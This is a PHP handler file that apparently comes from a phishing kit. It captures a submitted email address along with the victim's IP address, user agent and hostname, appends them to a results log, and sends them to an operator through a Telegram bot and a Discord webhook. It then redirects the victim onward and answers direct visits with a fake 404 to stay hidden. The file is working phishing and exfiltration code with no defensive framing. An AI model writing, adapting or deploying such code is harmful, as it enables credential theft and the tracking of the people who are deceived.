<?php
if (isset($_POST["email"]))
{
session_start();
$mail = $_SESSION['mail'] = $_POST["email"];
$ip   = $_SERVER['REMOTE_ADDR'];
$UA   = $_SERVER['HTTP_USER_AGENT'];
$host = $_SERVER['REMOTE_HOST'];
include '../admin/config.php';
$chatId = trim(file_get_contents("../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
extract($_REQUEST);


$file=fopen("../results/contact.txt","a");


# Format for log.txt file
// Here variable $a is just an example (replace with your own variables)

fwrite($file," << N E W   M A F I S O   C O N T A C T >>\r\n");
fwrite($file, "Email: ". $mail ."\r\n");
fwrite($file," <<       S E S S I O N    I N F O      >>\r\n");
fwrite($file, "User Agent: ". $UA ."\r\n");
fwrite($file, "IP: ". $ip ."\r\n");
fwrite($file, "HOSTNAME : ". $host ."\r\n");
fwrite($file,"<<      E N D   O F   C O N T A C T     >>\r\n");
fclose($file);


# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)
$_SESSION['check2'] = "true";


# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)
$data = " << N E W   M A F I S O   C O N T A C T >>\r\n";
$data.= " > Email:   $mail\r\n";
$data.= " <<       S E S S I O N    I N F O      >>\r\n";
$data.= " > User Agent: $UA \r\n";
$data.= " >IP : $ip \r\n";
$data.= " >HOSTNAME : $host \r\n";
$data.= "<<     E N D   O F   C O N T A C T      >>\r\n";



// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}

header("location: ../accounts_link.php");
}
else
{
    exit(header("HTTP/1.0 404 Not Found"));
}
